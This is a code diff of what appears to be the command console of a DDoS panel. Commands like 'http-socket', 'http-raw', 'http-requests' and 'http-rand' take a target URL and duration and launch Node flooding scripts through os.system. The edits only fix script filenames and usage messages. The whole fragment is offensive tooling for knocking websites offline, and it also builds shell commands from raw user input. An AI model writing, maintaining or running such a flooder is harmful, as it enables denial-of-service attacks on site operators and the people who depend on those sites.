@@ -329,14 +329,14 @@ def main():
                 time = cnc.split()[3]
                 os.system(f'node HTTP-SOCKET {url} {per} {time}')
             except IndexError:
-                print('Usage: http-socket <url> <per> <time>')
+                print('Usage: HTTP-SOCKET.js <url> <per> <time>')
                 print('Example: http-socket http://example.com 5000 60')
 
         elif "http-raw" in cnc:
             try:
                 url = cnc.split()[1]
                 time = cnc.split()[2]
-                os.system(f'node HTTP-RAW {url} {time}')
+                os.system(f'node HTTP-RAW.js {url} {time}')
             except IndexError:
                 print('Usage: http-raw <url> <time>')
                 print('Example: http-raw http://example.com 60')
@@ -345,7 +345,7 @@ def main():
             try:
                 url = cnc.split()[1]
                 time = cnc.split()[2]
-                os.system(f'node HTTP-REQUESTS {url} {time}')
+                os.system(f'node HTTP-REQUESTS.js {url} {time}')
             except IndexError:
                 print('Usage: http-requests <url> <time>')
                 print('Example: http-requests http://example.org 60')
@@ -354,7 +354,6 @@ def main():
             try:
                 url = cnc.split()[1]
                 time = cnc.split()[2]
-                rps = cnc.split()[3]
                 os.system(f'node HTTP-RAND.js {url} {time}')
             except IndexError:
                 print('Usage: http-rand <url> <time>')
